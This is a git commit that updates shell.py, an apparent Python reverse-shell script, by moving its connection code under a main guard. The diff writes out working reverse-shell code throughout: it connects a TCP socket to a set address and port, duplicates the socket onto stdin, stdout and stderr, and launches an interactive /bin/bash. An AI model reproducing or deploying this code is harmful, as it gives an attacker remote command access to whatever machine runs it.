1e6f739f5da6b2623e8ecbefb87f56d30081e5f2
Keyjeek <88333825+Keyj33k@users.noreply.github.com>
2022-04-06 07:04:23 +0200

    Update shell.py

--- shell.py
+++ shell.py
@@ -21,15 +21,17 @@ class shell:
         self.target_port = target_port
             
 reverse_connection = shell("127.0.0.1", int(5003))
-from os import dup2
-import socket
-os.system('clear')
 
-# Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
-    
-dup2(socket_sock.fileno(),0)
-dup2(socket_sock.fileno(),1)
-dup2(socket_sock.fileno(),2)
-run(["/bin/bash","-i"]) 
+if __name__ == "__main__":
+    from os import dup2
+    import socket
+    os.system('clear')
+
+    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
+    socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
+        
+    dup2(socket_sock.fileno(),0)
+    dup2(socket_sock.fileno(),1)
+    dup2(socket_sock.fileno(),2)
+    run(["/bin/bash","-i"]) 
